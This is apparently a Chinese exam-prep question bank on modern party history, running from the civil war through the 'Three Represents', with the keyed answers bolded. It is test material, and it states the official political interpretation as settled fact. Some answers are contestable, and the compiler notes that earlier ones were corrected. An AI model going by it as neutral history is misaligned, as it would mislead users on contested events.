<p>（）战役历时六十六天，歼敌55.5万人。为解放军渡江作战，解放国民党反动统治的中心地带南京、上海创造了极为有利的条件。<br>辽沈<br>平津<br><strong>淮海</strong><br>孟良崮</p>
<p>中共中央在（）上提出两个务必：务必继续保持谦虚、谨慎、不骄、不躁的作风，务必继续保持艰苦奋斗的作风，警惕资产阶级“糖衣炮弹”的攻击。<br>中共中央于1948年9月召开的政治局扩大会议<br>中国人民政治协商会议第一届全体会议<br><strong>中共七届二中全会</strong><br>中共十一届三中全会</p>
<p>全面内战开始以后，国民党统治区的社会经济形势急剧恶化。具体表现不包括（）。<br>农业经济严重萎缩，农村饥民遍地<br>广大劳动者被极度压榨<br><strong>民族资本极度膨胀，控制着整个国家的经济命脉</strong><br>公务人员、教职员和学生的生活陷入极端的困境，广大民众在饥饿和死亡线上挣扎</p>
<p>为了给自卫战争奠定牢固的群众基础，中共中央于5月4日发出改变解放区土地政策的指示，将抗战以来的“减租减息”政策改为（）政策。<br>“家庭联产承包责任制”<br>“打土豪、分田地”<br>“双减双交”<br><strong>“耕者有其田”</strong></p>
<p>1947年3月年国民党强迫中共驻（）的代表全部撤退。通过谈判争取和平的大门完全被国民党封死，国共关系彻底破裂。<br><strong>南京</strong><br>广州<br><strong>上海</strong><br><strong>重庆</strong></p>
<h1 id="六-中华人民共和国的成立和社会主义制度的确立"><a href="#六-中华人民共和国的成立和社会主义制度的确立" class="headerlink" title="六  中华人民共和国的成立和社会主义制度的确立"></a>六  中华人民共和国的成立和社会主义制度的确立</h1><p>国家资本主义有以下两种形式，即（），主要是国家同资本家在企业外部的合作，和（），是社会主义成分同资本主义成分在企业内部的合作。<br><strong>加工订货，公私合营</strong><br>市场调控，公私合营<br>加工订货，国家统筹<br>市场调控，国家统筹</p>
<p>1953年，党先后做出关于农业生产互助合作的决议和关于发展农业生产合作社的决议。两个决议要求按照积极发展、稳步前进的方针和（）的原则，采取典型示范和逐步推广的方法，把农业互助合作当作一件大事去做。<br><strong>自愿互利</strong><br>人民公社化<br>互助互利<br>共产主义</p>
<p>随着人民解放军的胜利进军，新解放地区迅即建立临时的过渡性政权（），镇压反革命的破坏活动，接管国民党的一切公共机关，维护社会秩序，帮助各地召集各界人民代表会议，选举地方人民政府。<br>中国人民临时政府<br><strong>军事管制委员会</strong><br>中国人民政府<br>苏维埃临时政府</p>
<p>（）年6月，朝鲜战争爆发，美国随即打着联合国旗号武装干涉朝鲜并派遣第七舰队入侵台湾海峡。经过中国志愿军与朝鲜人民多年的浴血奋战，美国于（）年7月27日在停战协定上签字。<br>1950，1954<br>1951，1953<br><strong>1950，1953</strong><br>1951，1954</p>
<p>1956 年,生产资料的社会主义改造基本完成，（）和劳动群众集体所有制这两种社会主义公有制形式，已在整个国民经济中占居绝对优势地位。伴随着社会主义经济基础的建立，我国人民民主专政的国家制度也逐步健全起来。<br>个体私有制<br>全民公有制<br>国家所有制<br><strong>全民所有制</strong></p>
<p>在向社会主义过渡的进程中，我党创造了一系列适合中国特点的过渡形式。而这一过渡过程中，不包括一下那个方面？<br><strong>社会主义工商业</strong><br>农业<br>资本主义工商业<br>个体手工业</p>
<p>在新解放区工矿企业大都遭到不同程度破坏，恢复生产面临严重困难的情况下，七届二中全会确定进入城市后党的工作要以（）为中心。<br>恢复和发展农业<br>恢复和发展经济<br><strong>恢复和发展生产</strong><br>恢复和发展工商业</p>
<p>“三反”、“五反”运动是1951年底到1952年10月，在党政机关工作人员中开展的“（）”和在私营工商业者中开展的“反行贿、反偷税漏税、反盗骗国家财产、反偷工减料、反盗窃国家经济情报”的斗争的统称。<br><strong>反贪污</strong><br><strong>反浪费</strong><br><strong>反官僚主义</strong><br>反本本主义</p>
<p>1954年9月15日至28日，第一届全国人民代表大会第一次会议在北京隆重召开。大会通过了（），以根本大法的形式，把中国共产党在过渡时期的总路线作为国家在过渡时期的总任务确定下来。<br>《中华人民共和国人民代表大会制度》<br><strong>《中华人民共和国宪法》</strong><br>《共同纲领》<br>《中华人民共和国政治协商制度》</p>
<p>七届三中全会闭幕以后，经济方面的一个重大举措是合理调整城市工商业。中央确定:在“公私兼顾、劳资两利”的方针下，抓好调整（）。<br>供需关系<br><strong>产销关系</strong><br><strong>公私关系</strong><br><strong>劳资关系</strong></p>
<p>（）是新中国成立后在财政经济战线上一个具有重大意义的胜利。它证明中国共产党不仅在军事上、政治上是强有力的，在经济上也是完全有办法的。<br>恢复国民经济<br>调整产业结构<br><strong>稳定物价和统一财经的工作</strong><br>对资本主义工商业的社会主义改造</p>
<p>第一届人民政治协商会议选举产生的中央人民政府委员会举行第一次会议，一致决议接受（）为施政纲领。<br>《中国人民政治协商制度》<br>《中华人民共和国宪法》<br><strong>《共同纲领》</strong><br>《中国人民代表大会制度》</p>
<p>农业互助合作运动的发展和（）政策的实行，直接推动资本主义工商业社会主义改造的进程。<br>人民公社化<br>自愿互利<br>互助互利<br><strong>粮食统购统销</strong></p>
<p>截至1950年10月，我党歼灭国民党正规军128万余人，实现了除（）、台湾和少数岛屿以外的全部中国领土的解放。<br>东北<br><strong>西藏</strong><br>海南<br>新疆</p>
<p>党对资本主义工商业的政策，概括为“（）”。<br><strong>利用</strong><br>发展<br><strong>改造</strong><br><strong>限制</strong></p>
<p>在中国实现社会主义，是中国共产党自创立时起就确定的奋斗目标。但是，基于旧中国是一个经济文化十分落后的半殖民地半封建社会的基本国情，我党确定实现社会主义必须分两步走，必须经过（）才能转入社会主义革命。这是中国革命发展的必由之路。<br><strong>新民主主义革命</strong><br>共产主义改造<br>社会主义改造<br>共产主义革命</p>
<p>中央人民政府同西藏地方政府达成关于和平解放西藏办法的协议，西藏获得和平解放的时间是（）。<br>1949<br><strong>1951</strong><br>1950<br>1952</p>
<p>实现国家的（），是国家独立富强的客观要求和必要条件。<br><strong>社会主义工业化</strong><br>土地改革<br>国有化改革<br>社会主义改造</p>
<p>1950年6月召开了党的七届三中全会。毛泽东指出，我国财政经济状况的根本好转，要用三年左右的时间，创造三个条件，即：（）。<br>社会主义改造的完成<br><strong>土地改革的完成</strong><br><strong>现有工商业的合理调整</strong><br><strong>国家机构所需经费的大量节减</strong></p>
<p>整风运动的主要任务是：克服骄傲自满、贪图享受的情绪和官僚主义、命令主义作风，加强党和群众的联系。整风的方式是结合工作实际，自上而下地学习文件，分析情况，（）。<br><strong>开展批评和自我批评</strong><br><strong>成立整风训练班</strong><br><strong>总结工作</strong><br><strong>逐级召开整风会议</strong></p>
<p><em>2020.4.28更新：上题由单选改为多选，增加了后三个选项。</em></p>
<h1 id="七-探索建设社会主义道路的良好开端和曲折发展"><a href="#七-探索建设社会主义道路的良好开端和曲折发展" class="headerlink" title="七  探索建设社会主义道路的良好开端和曲折发展"></a>七  探索建设社会主义道路的良好开端和曲折发展</h1><p>1957年2月，毛泽东在最高国务会议上发表《关于正确处理人民内部矛盾的问<br>题》讲话，他指出社会主义社会的矛盾可以分为（）两类性质截然不同的矛盾。<br>资社之间矛盾<br><strong>敌我之间矛盾</strong><br><strong>人民内部矛盾</strong><br>左右之间矛盾</p>
<p>大跃进运动从（）开始全面展开。<br><strong>1958年</strong><br>1959年<br>1956年<br>1957年</p>
<p>1958年，以毛泽东为首的党中央提出要把党和国家的工作重点转到（）上来。<br>社会主义改造<br>批“左”思想<br>反“右”斗争<br><strong>技术革命和社会主义建设</strong></p>
<p>在1956年的中共八大上，由陈云同志提出的经济建设方面的重要思想是（）<br>综合平衡中稳步前进<br>科学技术是第一生产力<br>十五年赶超英美<br><strong>三个主体，三个补充</strong></p>
<p>1957年全党整风运动迅速开展之后，面对资产阶级右派分子的疯狂进攻，6月8日，中央<br>发出组织力量反击右派分子进攻的党内指示，《人民日报》发表题为（）的社论。<br>《把主要精力集中到整风运动上来》<br><strong>《这是为什么》</strong><br>《一切为了国家的总路线》<br>《将革命进行到底》</p>
<p>1956年，毛泽东在中共中央政治局扩大会议上正式提出在科学文化工作中实行（）的<br>方针政策。<br>科教兴国，人才强国<br><strong>百花齐放，百家争鸣</strong><br>韬光养晦，有所作为<br>解放思想，实事求是</p>
<p>下列选项中，属于“大跃进”运动产生的时代背景的是？<br>当时国内的科学技术水平发展到了有可能实现“大跃进”经济指标的程度<br><strong>短时间内接踵而至的胜利，使人们相信中国富强的目标可能在一个较短的时间内实现</strong><br><strong>八届三中全会改变了八大一次会议确认的在经济建设上既反保守又反冒进的方针</strong><br><strong>反右派斗争后，党中央认为人民群众的热情高涨，经济建设可以搞得更快一些</strong></p>
<p>下列选项中哪些不是1956年中共八大所明确指出的当前国内主要矛盾？<br>人民对经济文化迅速发展的需要同当前经济文化不能满足人民需要的状况之间的矛盾<br><strong>帝国主义和中华民族的矛盾</strong><br><strong>无产阶级同资产阶级之间的矛盾</strong><br>人民对于建立先进的工业国的要求同落后的农业国的现实之间的矛盾</p>
<p><em>2020.4.28更新：上题答案进行了校正更改，改为正确的二、三项。</em></p>
<p>人民公社化运动对我国国民经济造成严重伤害，其错误的实质是（）。<br>没有注意到生态环境的保护<br><strong>生产关系的调整不符合生产力的实际水平</strong><br>破坏国民经济正常的比例关系<br>打破国家财政收支平衡</p>
<p>下列不属于“文化大革命”爆发前曲折探索的十年里党领导的社会主义建设所取得的巨<br>大成就的是（）。<br>实现原油的全部自给<br>成功地爆炸第一颗原子弹<br><strong>我国第一个人造卫星“东方红一号”成功发射</strong><br>全国农用拖拉机产量和化肥施用量都增长6倍以上，农村用电量增长70倍</p>
<p>中共（）正式决定对国民经济实行“调整、巩固、充实、提高”的八字方针。<br>八大<br>庐山会议<br><strong>八届九中全会</strong><br>十一届三中全会</p>
<p>中共八大前后，毛泽东在探索中国自己的社会主义建设道路中提出的重要思想不包括（）。<br>把正确处理人民内部矛盾作为国家政治生活的主题<br>走出一条适合中国国情的中国工业化道路<br>调动一切积极因素，建设社会主义伟大国家<br><strong>经济建设必须坚持既反保守又反冒进的方针</strong></p>
<p>1958年5月召开的八大二次会议，正式提出了（）的总路线，反映了广大人民群众迫切要求尽快改变我国经济文化落后状况的普遍愿望。<br>“自立根生，艰苦创业，为把我国建设成为富强、民主、文明的社会主义现代化国家 而奋斗”<br>“一个中心，两个基本点”<br><strong>“鼓足干劲、力争上游、多快好省地建设社会主义”</strong><br>“逐步实现国家的社会主义工业化，逐步实现国家对农业、对手工业和对资本主义工 商业的社会主义改造”</p>
<p>下列哪些行为属于1957年全党整风期间，极少数资产阶级右派分子对我党的攻击行为？<br><strong>把人民民主专政的制度说成是产生官僚主义、宗派主义和主观主义的根源</strong><br><strong>公然提出共产党退出机关、学校，公方代表退出合营企业，要求“轮流坐庄”</strong><br><strong>把共产党在国家政治生活中的领导地位，攻击为“党天下”</strong><br><strong>极力抹煞社会主义改造和建设的成绩，根本否定社会主义制度的优越性</strong></p>
<p>标志着中国共产党在探索建设自己的社会主义道路上取得了初步成果的是（）会议。<br>十一届三中全会<br>中共二大<br>七届二中全会<br><strong>中共八大</strong></p>
<p>1956年召开的中共八届一中全会选举的中央政治局常务委员会不包括（）。<br>邓小平<br>毛泽东<br>陈云<br><strong>彭德怀</strong></p>
<p>中共八大指出，我国无产阶级同资产阶级之间的矛盾已经基本解决。得出这一结论的主要依据是（）。<br>实现了对官僚资本的没收<br>第一个五年计划的完成<br>“三反”“五反”运动的进行<br><strong>三大改造的完成</strong></p>
<p>对1956年至1966年这十年建设的客观评价可以是？<br><strong>我国赖以进行现代化建设的物质技术基础，很大一部分是这个期间建设起来的</strong><br><strong>全国经济文化建设等方面的骨干力量和工作经验，大部分是在此期间培养积累起来的</strong><br><strong>是党领导我国社会主义建设在探索中曲折发展的十年</strong><br><strong>虽然遭受过严重挫折，仍然取得了很大成就</strong></p>
<p>下列选项中，属于“大跃进”期间生产建设特点的是？<br><strong>瞎指挥</strong><br><strong>浮夸风</strong><br><strong>共产风</strong><br><strong>高指标</strong></p>
<p>中共八大所规定的党和全国人民当前的主要任务是（）。<br><strong>发展社会生产力</strong><br>进行社会主义改造<br>坚持实事求是<br>健全党内外民主制度</p>
<h1 id="八-十年“文化大革命”错误的纠正和社会主义事业发展新时期的开辟"><a href="#八-十年“文化大革命”错误的纠正和社会主义事业发展新时期的开辟" class="headerlink" title="八  十年“文化大革命”错误的纠正和社会主义事业发展新时期的开辟"></a>八  十年“文化大革命”错误的纠正和社会主义事业发展新时期的开辟</h1><p>下面对文化大革命的叙述正确的是（）。<br><strong>由于各级干部、党员和工人、农民、解放军指战员、知识分子的抵制、抗争和斗争，“文化大革命”的破坏性作用受到一定限制</strong><br><strong>“文化大革命”是错误理论指导下的错误实践</strong><br><strong>十年“文化大革命”是一场由领导者错误发动，被反革命集团利用，给党、国家和各族人民带来严重灾难的内乱</strong><br>这场由政治领域发端的“大革命”，对教育、科学、文化的破坏尤其严重，影响极为深远</p>
<p>1978年9月下旬，国务院召开的全国计划会议又提出，经济工作必须实行三个转变（）。<br><strong>把注意力转到生产斗争和技术革命上来</strong><br>把工作重心转移到经济建设上来<br><strong>把管理制度和管理方法转到按照经济规律办事的科学管理的轨道上来</strong><br><strong>从闭关自守或半闭关自守状态转到积极引进国外先进技术，利用国外资金，大胆进入国际市场的开放政策上来</strong></p>
<p>（）的胜利，结束了“文化大革命”这场灾难，从危难中挽救了中国的社会主义事业，为党和国家进入新的历史时期创造了前提。<br>十一届三中全会的召开<br><strong>粉碎“四人帮”</strong><br>粉碎林彪反革命集团<br>“实践是检验真理唯一标准”的发表</p>
<p>（）年秋，在“文化大革命”中被废弃的高考制度得到恢复，全国高校重新通过统一考试招收新生。<br>1978<br>1979<br><strong>1977</strong><br>1976</p>
<p>以下对毛泽东的评价正确的是（）。<br><strong>毛泽东在全局上坚持“文化大革命”的错误，但也制止和纠正过一些具体错误，保护过一些党的领导干部和党外著名人士</strong><br><strong>全面评价毛泽东的一生，他的功绩是第一位的，是不可磨灭的</strong><br><strong>对于“文化大革命”这一全局性的、长时间的“左”倾错误，毛泽东负有主要的责任</strong><br><strong>毛泽东是伟大的马克思主义者，是伟大的无产阶级革命家、战略家和理论家</strong></p>
<p>以下叙述哪个是错误的（）。<br>1977年2月7日，《人民日报》、《红旗》杂志、《解放军报》同时发表的社论却提出“两个凡是”的指导方针<br><strong>《光明日报》发表经中央党校副校长邓小平审定的《实践是检验真理的唯一标准》一文</strong><br>党的九大以后，“斗、批、改”运动在全国展开。按照毛泽东的设想，“斗、批、改”包括建立革命委员会、大批判、清理阶级队伍、整党、精简机构、改革不合理的规章制度、下放科室人员等阶段<br>毛泽东逝世前后，“四人帮”加紧了夺取党和国家最高领导权的阴谋活动</p>
<p>1975年1月13日至17日，第四届全国人民代表大会第一次会议在北京举行。周恩来在政府工作报告中，重申在二十世纪内全面实现（）四个现代化的宏伟目标。<br>经济、工业、国防和科学技术<br>农业、经济、国防和科学技术<br>农业、工业、制造业和科学技术<br><strong>农业、工业、国防和科学技术</strong></p>
<p>《实践是检验真理的唯一标准》一文鲜明地提出（）。<br><strong>马克思主义的理论宝库不是一堆僵死不变的教条，对“四人帮”设置的禁锢人们思想的禁区，要敢于触及，弄清是非</strong><br><strong>社会实践不仅是检验真理的标准，而且是唯一的标准</strong><br>对马克思主义的基本常识作反面阐述<br><strong>实际上批判了“两个凡是”，因而引起“两个凡是”同实事求是两种观点的激烈争论</strong></p>
<p>“文化大革命”中最大的一起冤案是（）。<br>“一月革命”<br>陆定一遭批判<br>“二月逆流”<br><strong>刘少奇冤案</strong></p>
<p>1965年11月10日，上海《文汇报》发表的姚文元（）一文，是引发“文化大革命”的导火线。<br>《关于当前学术讨论的汇报提纲》<br>《关于加快工业发展的若干问题》<br>《炮打司令部——我的一张大字报》<br><strong>《评新编历史剧&lt;海瑞罢官&gt;》</strong></p>
<p>“四人帮”利用“批林批孔”把矛头指向老一辈革命家。他们在各种场合的讲话中，点名攻击中央、地方和军队的一批干部，影射（）是“现在的儒”。<br><strong>周恩来</strong><br>朱德<br>邓小平<br>刘少奇</p>
<p>在调整经济的同时，农村和企业的改革也迈出步伐。经济体制改革，首先在农村取得成功。1980年，（）的一个公社挂出乡人民政府的牌子，成为全国第一个取消人民公社的地方。　　　<br>安徽凤阳小岗村<br><strong>四川省广汉县</strong><br>广西壮族自治区<br>深圳边陲小镇</p>
<p>1966年5月4日至26日，中央政治局召开扩大会议。会议于5月16日通过的《中国共产党中央委员会通知》（简称“五一六通知”）对“二月提纲”进行了全面批判的主要目的是（）。<br>为了竭力鼓吹个人崇拜<br>为了对彭真等中央领导人进行批判<br><strong>为了在全国发动“文化大革命”</strong><br>为了撤销以彭真为首的文化革命小组，成立中央文化革命小组</p>
<p>（）是建国以来党的历史上具有深远意义的伟大转折，彻底否定“两个凡是”的方针，重新确立解放思想、实事求是的指导思想。<br><strong>十一届三中全会</strong><br>第十一届全国代表大会<br>“文化大革命”的结束<br>党的第十届全国代表大会</p>
<p>党中央于1979年4月召开工作会议，制定（）的八字方针，开始对国民经济进行调整。<br><strong>“调整、改革、整顿、提高”</strong><br>“调整、改革、巩固、提高”<br>“调整、整顿、改革、提高”<br>“改革、整顿、巩固、提高”</p>
<p>经过几年全面的拨乱反正，十年“文化大革命”和长期“左”倾错误造成的严重混乱局面得到根本改观，国家重新呈现勃勃生机。党和政府的各级领导得到加强，优良的传统作风逐步得到恢复。干部队伍的（）迈出重要步伐，领导职务实际上存在的终身制开始改变。<br>革命化、规范化<br><strong>知识化、专业化</strong><br><strong>革命化、年轻化</strong><br>知识化、规范化</p>
<p>（）的发生，是“文化大革命”推翻党的一系列基本原则的结果，客观上宣告了“文化大革命”理论和实践的失败。<br>粉碎“四人帮”<br>关于真理标准问题的讨论<br><strong>林彪叛逃事件</strong><br>刘少奇冤案的平反</p>
<p>“九一三事件”客观上宣告了“文化大革命”理论和实践的破产，是指（）。<br>①毛泽东逐渐终止了“文化大革命” ②促使了广大人民群众清醒 ③“文革”标榜的反修防修与实际相反 ④国民经济走向崩溃<br><strong>②③</strong><br>①④<br>③④<br>①②</p>
<p>党的八届十一中全会期间，毛泽东写了《炮打司令部——我的一张大字报》，提出中央有一个资产阶级司令部，矛头直指（）。<br><strong>刘少奇　邓小平</strong><br>邓小平　周恩来<br>周恩来　罗瑞卿<br>刘少奇　周恩来</p>
<p>1980年2月，党的十一届五中全会通过（）。这是党取得全国政权后形成的指导和规范执政党思想、政治、组织建设的重要文献，对在新时期加强党的建设具有深远影响。<br>《党和国家领导制度的改革》<br>《关于建国以来党的若干历史问题的决议》<br><strong>《关于党内政治生活的若干准则》</strong><br>《实践是检验真理的唯一标准》</p>
<h1 id="九-建设中国特色社会主义"><a href="#九-建设中国特色社会主义" class="headerlink" title="九  建设中国特色社会主义"></a>九  建设中国特色社会主义</h1><p>下列四个选项中，（）与20世纪80年代无关。<br><strong>浦东新区高楼四起，跨国公司引人注目</strong><br>厦门有各地客商民工来去匆匆<br>日新月异的深圳：“时间就是金钱”的标语振奋人心<br>春天中，父子兄弟一起耕作承包的田地</p>
<p>中国共产党在与各国政党交往中，遵循“独立自主、完全平等、互相尊重、（）”四项基本原则。<br><strong>互不干涉内部事务</strong><br>和平共处<br>互相尊重主权和领土完整<br>互不干涉内政</p>
<p>下列关于十一届三中全会叙述正确的是（）。<br><strong>做出把工作重心转移到社会主义现代化建设上来的决策</strong><br><strong>形成了以邓小平为核心的第二代党中央领导集体，恢复了党的民主集中制原则</strong><br><strong>做出了改革开放的重大战略决策</strong><br><strong>确立了解放思想，实事求是的指导思想</strong></p>
<p>标志着我国进入社会主义现代化建设新时期的会议是（）。<br>中共十五大<br>中共十三大<br>中共十四大<br><strong>中共十一届三中全会</strong></p>
<p>中国共产党于1987年10月召开第十三次全国代表大会，大会批准了（）代表中央委员会作的《沿着有中国特色的社会主义道路前进》的报告。<br>陈云<br><strong>赵紫阳</strong><br>李鹏<br>邓小平</p>
<p>1982年9月1日至11日，中国共产党召开第十二次全国代表大会。下列选项中（）为此次会议的具体内容。<br>提出了经济体制改革的目标是建立社会主义市场经济体制<br>提出了党在社会主义初级阶段的基本纲领<br>阐明了党在社会主义初级阶段的基本路线<br><strong>提出建设有中国特色社会主义的思想为整个改革开放和现代化建设的指导思想</strong></p>
<p>党召开十二届三中全会，讨论并通过了《关于经济体制改革的决定》。《决定》要求：把（）作为经济体制改革的中心环节。<br>大型企业改革<br>中小型企业改革<br>国有企业改革<br><strong>增强企业活力</strong></p>
<p>党的十二届七中全会于（）年举行。<br>1986<br>1982<br><strong>1987</strong><br>1983</p>
<p>改革开放后沿袭了中华人民共和国成立以来的许多外交政策，下列表述不正确的是（）<br>重视和第三世界发展中国家的关系<br>坚持和平共处五项原则<br><strong>奉行不结盟的和平外交策略</strong><br>反对霸权主义和强权政治</p>
<p>党的第十二次全国代表大会在提出经济建设目标的同时，又明确指出（）是社会主义的重要特征，是社会主义制度优越性的重要表现。<br>社会主义法治<br><strong>社会主义精神文明</strong><br>社会主义和谐社会<br>社会主义市场经济</p>
<p>社会主义初级阶段是不可逾越的，这主要取决于（）。<br>经济传统的不可逾越性<br>生产关系发展的不可逾越性<br><strong>生产力发展的不可逾越性</strong><br>市场经济的不可逾越性</p>
<p>我们强调社会主义初级阶段的长期性，下列选项不是原因的是（）。<br><strong>在这个阶段需要对资本主义进行补课</strong><br>要防止急躁、冒进超越社会发展阶段<br>社会主义社会是一个相当长期的、独立的社会形态<br>我国是一个经济文化落后的国家</p>
<p>邓小平于（）向中央政治局正式提出辞去中共中央军事委员会主席职务的请求。<br>1989年5月<br>1987年5月<br><strong>1989年9月</strong><br>1987年9月</p>
<p>十一届三中全会以后，在城乡进行经济体制改革，其中农村改革的侧重点是（）。<br>调整农村产业结构，强调非农产业<br>改革生产资料所有制，强调共同发展<br><strong>改革人民公社管理体制，强调自主经营</strong><br>改革产品分配旧体制，强调按劳分配</p>
<p>我们党的基本路线的一个重要内容是坚持四项基本原则，那么坚持四项基本原则的内容是（）。<br><strong>坚持马列主义、毛泽东思想</strong><br><strong>坚持人民民主专政</strong><br><strong>坚持中国共产党的领导</strong><br><strong>坚持社会主义道路</strong></p>
<p>党的十二届一中全会选举（）为中央委员会总书记，（）为中央军事委员会主席。<br>邓小平 胡耀邦<br><strong>胡耀邦 邓小平</strong><br>赵紫阳 邓小平<br>邓小平 赵紫阳</p>
<p>1988年3月至4月举行的七届全国人大一次会议，选举（）为国家主席。<br>万里<br>邓小平<br>李鹏<br><strong>杨尚昆</strong></p>
<p>改革开放后最早建立的四个经济特区是（）。<br>深圳、珠海、海南、厦门<br>珠海、海南、厦门、福建<br>珠海、厦门、汕头、福建<br><strong>深圳、珠海、厦门、汕头</strong></p>
<p>下列不属于党中央和国务院在1984年5月决定的沿海港口城市的是（）。<br>南通<br>连云港<br><strong>杭州</strong><br>秦皇岛</p>
<p>邓小平是我国改革开放和社会主义现代化建设的总设计师，主要是因为（）。<br>他主张拨乱反正，打破精神枷锁<br>他否定了“两个凡是”的方针<br><strong>他解决了怎样建设社会主义的基本问题</strong><br>他领导粉碎了“四人帮”</p>
<h1 id="十-社会主义改革开放新时期和中国特色社会主义现代化建设新阶段-建设中国特色社会主义"><a href="#十-社会主义改革开放新时期和中国特色社会主义现代化建设新阶段-建设中国特色社会主义" class="headerlink" title="十  社会主义改革开放新时期和中国特色社会主义现代化建设新阶段 建设中国特色社会主义"></a>十  社会主义改革开放新时期和中国特色社会主义现代化建设新阶段 建设中国特色社会主义</h1><p>2000年10月，党的十五届五中全会通过《关于制定国民经济和社会发展第十个五年计划的建议》，提出从新世纪开始，我国将进入全面建设小康社会并加快推进现代化的新的发展阶段；今后五到十年，要以（）为主题，以（）为主线，以（）为动力，以提高人民生活水平为根本出发点，全面推进经济发展和社会进步。<br>发展 改革开放 科技创新<br>改革开放和科技进步 结构调整 经济建设<br>发展 经济建设 改革开放和科技创新<br><strong>发展 结构调整 改革开放和科技进步</strong></p>
<p>十七大，首次将“（）”纳入中国特色政治制度范畴。<br>政治协商制度<br>民族区域自治制度<br>人民代表大会制度<br><strong>基层群众自治制度</strong></p>
<p>进入二十一世纪，在和平与发展成为时代主题的当今世界，科技进步日新月异，经济全球化进程加快发展，世界格局多极化趋势不可逆转，以综合国力为基础的竞争日趋激烈。（）是党在新世纪的三大任务。<br><strong>维护世界和平与促进共同发展</strong><br><strong>完成祖国统一大业</strong><br><strong>推进社会主义现代化建设</strong><br>实现中华民族的伟大复兴</p>
<p>1992年初，邓小平视察南方，发表了重要谈话。1月18日至2月21日，邓小平先后视察<br>（）等地。<br><strong>武昌、深圳、珠海、上海</strong><br>武昌、深圳、珠海、福州<br>武昌、珠海、厦门、广东<br>深圳、上海、厦门、珠海</p>
<p>中国共产党第十四次全国代表大会做出具有深远意义的决策包括（）。<br>加强新形势下社会主义精神文明建设<br><strong>要求全党抓住机遇，加快发展，集中精力把经济建设搞上去</strong><br><strong>确立邓小平建设有中国特色社会主义理论在全党的指导地位</strong><br><strong>明确我国经济体制改革的目标是建立社会主义市场经济体制</strong></p>
<p>十七大报告指出，我们主张各国人民携手努力，推动建设持久和平、共同繁荣的和谐世界。为此，应该遵循联合国宪章宗旨和原则，恪守国际法和公认的国际关系准则，在国际关系中弘扬民主、和睦、（）、共赢精神。<br><strong>协作</strong><br>和谐<br>公平<br>和平</p>
<p>按照“一国两制”构想，中国政府通过外交谈判终于成功地解决了香港回归问题。（）中英两国政府正式签署联合声明，宣布中华人民共和国政府将对香港恢复行使主权，设立直辖于中央人民政府的香港特别行政区。<br>1990年10月<br><strong>1984年12月</strong><br>1987年4月<br>1997年7月</p>
<p>20世纪90年代，国内外突发一系列政治事件事件，其中与中国有关影响重大的三项政治事件分别是什么？ <br><strong>以李登辉为首的台湾分裂势力公开将两岸关系界定为“特殊的国与国关系”</strong><br><strong>少数人利用“法轮功”蛊惑人心，破坏社会稳定的事件</strong><br><strong>以美国为首的北约集团轰炸我驻南斯拉夫使馆</strong><br>“六四”政治风波</p>
<p>在十七大报告中谈到开创国防和军队现代化建设新局面时说，必须站在国家安全和发展战略全局的高度，统筹经济建设和国防建设，在全面建设小康社会进程中实现（）和（）的统一。<br>强国 强军<br>富民 强国<br>富民 强军<br><strong>富国 强军</strong></p>
<p>1995年1月30日，江泽民发表《为促进祖国统一大业的完成而继续奋斗》的重要讲话，就现阶段进一步发展两岸关系、推进祖国和平统一进程提出（）。<br>九条方针政策<br>独立自主和平外交政策<br><strong>八项主张</strong><br>基本法</p>
<p>中国共产党第（）次大会首次使用“邓小平理论”这个科学称谓，把这一理论作为指引党继续前进的旗帜。<br><strong>十五</strong><br>十六<br>十三<br>十四</p>
<p>2000年10月，党的十五届五中全会通过（），提出从新世纪开始，我国将进入全面建设小康社会并加快推进现代化的新的发展阶段。<br>《中共中央关于农业和农村工作若干重大问题的决定》<br>《中共中央关于完善社会主义市场经济体制若干问题的决定》<br><strong>《关于制定国民经济和社会发展第十个五年计划的建议》</strong><br>《中共中央关于建立社会主义市场经济体制若干问题的决定》</p>
<p>1997年9月12日至18日，中国共产党召开第十五次全国代表大会，大会指出公有制为主体、多种所有制经济共同发展，是我国社会主义初级阶段的一项基本经济制度。国有经济起主导作用，主要体现在（）上。公有制实现形式可以而且应当多样化，非公有制经济是我国社会主义市场经济的重要组成部分。<br>影响力<br>领导力<br><strong>控制力</strong><br>强制力</p>
<p>马克思列宁主义同中国实际相结合有两次历史性飞跃，产生了（）两大理论成果。<br><strong>毛泽东思想</strong><br>三个代表重要思想<br><strong>邓小平理论</strong><br>中国特色社会主义理论体系</p>
<p>1995年9月，党的十四届五中全会通过关于制定国民经济和社会发展第九个五年计划和2010年远景目标的建议。江泽民就社会主义现代化建设中若干重大关系问题作了阐述，强调改革是（），发展是（），稳定是（），把改革的力度、发展的速度和社会可承受的程度协调统一起来。<br>动力 前提 目的<br>前提 动力 目的<br>目的 动力 前提<br><strong>动力 目的 前提</strong></p>
<p>邓小平南巡讲话时指出，中国要警惕右，但主要是防止左。要抓住时机，发展自己，关键是发展经济。发展才是硬道理。必须依靠科技和教育，经济发展才能快一点。要坚持两手抓，一手抓改革开放，一手抓（）。<br>政治制度改革<br>法制建设<br><strong>打击各种犯罪活动</strong><br>经济建设</p>
<p>中国共产党第（）次全国代表大会决定不再设立中央顾问委员会。<br><strong>十四</strong><br>十二<br>十一<br>十三</p>
<p>1993年3月，党中央着手解决乱集资、乱拆借和经济过热问题。6月，中央决定加强宏观调控力度，突出抓（）工作，并颁布了一系列加强和改善宏观调控的措施。<br>财政<br><strong>金融</strong><br>税收<br>社会保障</p>
<p>当今时代，（）越来越成为民族凝聚力和创造力的重要源泉、越来越成为综合国力竞争的重要因素。<br>创新<br><strong>文化</strong><br>科技<br>人才</p>
<p>第七届全国人民代表大会根据（）的原则，起草并通过了《中华人民共和国香港特别行政区基本法》。<br><strong>“港人治港”</strong><br><strong>“高度自治”</strong><br>“和平统一”<br><strong>“一国两制”</strong></p>
<h1 id="十一-“三个代表”重要思想"><a href="#十一-“三个代表”重要思想" class="headerlink" title="十一  “三个代表”重要思想"></a>十一  “三个代表”重要思想</h1><p>“三个代表”重要思想是我们党的立党之本、执政之基、力量之源。这里的“本”、“基”、“源”，说到底就是（）。<br><strong>人民群众的支持和拥护</strong><br>发展先进生产力<br>发展先进文化<br>人民群众生活水平的提高</p>
<p>二十世纪八十年代末、九十年代初国内国际发生严重政治风波后，党之所以能够在异常复杂的环境中经受住严峻考验，关键在于（），为实现跨世纪的宏伟目标提供了根本保证。<br>不断自我反省<br>不断从失败中吸取教训<br><strong>不断加强自身建设</strong><br>不断改革创新</p>
